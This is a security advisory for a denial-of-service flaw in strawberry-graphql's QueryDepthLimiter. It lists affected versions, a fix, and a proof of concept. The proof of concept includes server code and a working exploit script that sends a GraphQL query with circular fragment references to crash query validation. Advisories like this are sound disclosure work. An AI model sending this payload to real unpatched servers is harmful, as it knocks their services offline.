# [M] Strawberry GraphQL has a Circular Fragment Reference DOS

## Summary
Severity: Medium
Advisory: GHSA-qfwv-87qj-98xq
CVE: CVE-2026-47706
CWE: CWE-400, CWE-674
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2026-06-04
Source: https://github.com/advisories/GHSA-qfwv-87qj-98xq
Type: github-advisory

## Affected
- PyPI: `strawberry-graphql` — affected >=0.71.0 <0.315.7

## Details
### Summary
The QueryDepthLimiter extension is vulnerable to an Application-level DOS due to a lack of cycle detection in fragment spreads. When a query contains circular fragment references the determine_depth function enters an infinite recursion, leading to a RecursionError and crashing the validation process.

### Details
The determine_depth function in query_depth_limiter.py recursively resolves FragmentSpreadNode without maintaining a set of visited fragments.
By submitting a query with circular fragment references (e.g., Fragment A $\rightarrow$ Fragment B $\rightarrow$ Fragment A), the validator enters an infinite recursion.

### PoC
**server code**
```
import strawberry
from fastapi import FastAPI
from strawberry.fastapi import GraphQLRouter
from strawberry.extensions import QueryDepthLimiter

@strawberry.type
class User:
    name: str = "GONA"

@strawberry.type
class Query:
    @strawberry.field
    def user(self) -> User:
        return User()

# Enable depth limiting
schema = strawberry.Schema(
    query=Query, 
    extensions=[QueryDepthLimiter(max_depth=10)]
)

app = FastAPI()
app.include_router(GraphQLRouter(schema), prefix="/graphql")
```

**exploit**
```
import httpx

# Circular reference: A -> B -> A -> B ...
payload = {
    "query": """
        fragment A on User {
            ...B
        }
        fragment B on User {
            ...A
        }
        query Crash {
            user {
                ...A
            }
        }
    """
}

try:
    response = httpx.post("http://127.0.0.1:8000/graphql", json=payload)
    print(response.json())
except Exception as e:
    print(f"Server crashed or timed out: {e}")
```

### Impact
Since the validation happens before execution, an attacker can cheaply trigger this recursion error to exhaust server CPU cycles and thread/worker pools

## References
- https://github.com/strawberry-graphql/strawberry/security/advisories/GHSA-qfwv-87qj-98xq
- https://nvd.nist.gov/vuln/detail/CVE-2026-47706
- https://github.com/strawberry-graphql/strawberry
- https://github.com/strawberry-graphql/strawberry/releases/tag/0.315.7
